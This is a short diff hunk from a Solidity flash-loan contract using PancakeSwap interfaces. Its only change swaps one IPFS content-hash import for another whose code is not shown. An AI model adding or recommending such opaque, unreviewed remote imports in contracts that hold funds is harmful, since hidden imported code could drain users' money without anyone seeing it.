@@ -11,7 +11,7 @@ import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contra
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
-import "ipfs://QmRtF25Y9q2eiDonBdoHp4c8SYEcQtjsDhYDSoCJpmBjeo";
+import "ipfs://QmW3JpW7eUVFpBpVbjfenvGTv99KAGXgSSu1eu4WRfeG4V";
 
 contract FlashLoan {
     string public tokenName;
